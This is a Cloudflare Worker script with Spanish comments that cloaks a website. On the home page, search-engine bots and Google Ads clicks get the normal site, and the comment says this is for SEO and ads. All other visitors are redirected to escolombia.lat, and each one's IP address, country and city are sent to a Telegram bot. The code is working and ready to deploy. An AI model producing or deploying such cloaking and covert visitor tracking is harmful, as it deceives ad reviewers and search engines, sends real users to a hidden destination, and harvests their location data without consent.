export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    const cf = request.cf || {};

    const country = cf.country || "Desconocido";
    const city = cf.city || "Desconocido";
    const ip = request.headers.get("CF-Connecting-IP") || "Desconocido";
    const userAgent = request.headers.get("User-Agent") || "";

    const isBot = /Googlebot|Bingbot|Slurp/i.test(userAgent);
    const isAdClick = url.searchParams.has("gclid");
    const isHome = path === "/" || path === "/index.html";

    // --- DATOS DESDE VARIABLES DE ENTORNO (opcional) ---
    const TOKEN = env.TELEGRAM_TOKEN;
    const CHAT_ID = env.TELEGRAM_CHAT_ID;
    // ---------------------------------------------------

    console.log(`[GEO] country=${country} city=${city} path=${path} bot=${isBot} ad=${isAdClick}`);

    // 1. TODAS las visitas (excepto bots y clics de anuncios) -> escolombia.lat
    if (isHome && !isBot && !isAdClick) {
      if (TOKEN && CHAT_ID) {
        ctx.waitUntil(enviarTelegram(TOKEN, CHAT_ID,
          `↪️ Visitante redirigido a escolombia.lat\nPaís: ${country}\nCiudad: ${city}\nIP: ${ip}`));
      }
      return Response.redirect("https://escolombia.lat/", 302);
    }

    // 2. Bots y clics de anuncios: se les entrega el sitio normal (para SEO/ads)
    return env.ASSETS.fetch(request);
  }
};

// Envío a Telegram con timeout
async function enviarTelegram(token, chatId, text) {
  const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    await fetch(tgUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true }),
      signal: controller.signal
    });
    clearTimeout(timeoutId);
  } catch (e) {
    console.error("Error Telegram:", e);
  }
}
